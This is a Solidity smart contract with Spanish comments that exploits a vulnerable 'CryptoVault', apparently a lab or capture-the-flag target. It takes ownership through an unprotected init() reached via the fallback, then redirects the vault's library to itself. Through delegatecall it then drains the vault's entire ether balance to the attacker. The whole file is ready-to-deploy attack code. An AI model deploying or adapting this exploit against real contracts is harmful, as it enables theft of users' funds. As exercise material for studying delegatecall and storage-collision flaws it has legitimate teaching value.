pragma solidity ^0.6.0;

contract AttackDelegatecall {
    address public targetVault;

    constructor(address _vaultAddress) public {
        targetVault = _vaultAddress;
    }

    function attack() external {
        // Llamamos a init() a través del fallback. 
        // Esto cambia el 'owner' de CryptoVault a la dirección de este contrato malicioso.
        (bool success1, ) = targetVault.call(abi.encodeWithSignature("init(address)", address(this)));
        require(success1, "Ataque 1: Fallo al secuestrar el owner");

        // Como ahora somos los dueños, llamamos a setVaultLib para cambiar la librería apuntando a nosotros.
        (bool success2, ) = targetVault.call(abi.encodeWithSignature("setVaultLib(address)", address(this)));
        require(success2, "Ataque 2: Fallo al sobrescribir tLib");

        //Hacemos una llamada cualquiera para activar el fallback. 
        // El delegatecall ahora ejecutará nuestro propio código (la función 'drain') con el saldo del Vault.
        (bool success3, ) = targetVault.call(abi.encodeWithSignature("drain()"));
        require(success3, "Ataque 3: Fallo al drenar los fondos");
    }

    // Esta función será ejecutada por CryptoVault a través de un delegatecall.
    // Como se ejecuta en su contexto, el balance que se envía es el de CryptoVault.
    function drain() external {
        msg.sender.call{value: address(this).balance}("");
    }

    fallback() external payable {}
    receive() external payable {}
}